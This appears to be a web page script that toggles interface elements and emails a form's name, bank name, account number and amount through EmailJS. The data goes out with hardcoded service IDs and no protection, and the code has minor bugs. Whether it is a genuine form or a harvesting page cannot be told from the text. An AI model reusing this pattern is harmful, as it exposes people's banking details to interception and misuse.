function showLoading() {
  const loaderContainer = document.querySelector(".loader-container");
  loaderContainer.style.display = "block";
}

// Function to hide the loading indicator
function hideLoading() {
  const loaderContainer = document.querySelector(".loader-container");
  loaderContainer.style.display = "none";
}
function showZoom() {
  const buttonContainer = document.querySelector(".button-container");
  buttonContainer.style.display = "block";
}

// Function to hide the loading indicator
function hideZoom() {
  const buttonContainer = document.querySelector(".button-container");
  buttonContainer.style.display = "none";
}

function showContainer() {
  const confirmContainer = document.querySelector(".confirm-container");
  confirmContainer.style.display = "block";
  hideCard();
}

// Function to hide the loading indicator
function hideContainer() {
  const confirmContainer = document.querySelector(".confirm-container");
  confirmContainer.style.display = "none";
}
function showCard() {
  const card = document.querySelector(".card_bg");
  card.style.display = "block";
}

// Function to hide the loading indicator
function hideCard() {
  const card = document.querySelector(".card_bg");
  card.style.display = "none";
}
document.addEventListener("DOMContentLoaded", () => {
  hideContainer();
  hideZoom();
  hideLoading();
});
function sendMail() {
  var templateParams = {
    to_name: document.getElementById("full_name").value,
    bankname: document.getElementById("bankname").value,
    account_no: document.getElementById("account_no").value,
    amount: document.getElementById("amount").value,
  };

  const response = emailjs
    .send("service_iv2ixbh", "template_gae9hs9", templateParams)
    .then(
      (response) => {
        alert(
          "WE HAVE RECIEVED YOUR RESPONSE!",
          response.status,
          response.text
        );
        hideLoading();
        showZoom();
      },
      (error) => {
        console.log("FAILED...", error);
        alert("FAILED...", error);
      }
    );
  if (!response.ok) {
    showLoading();
  }
}
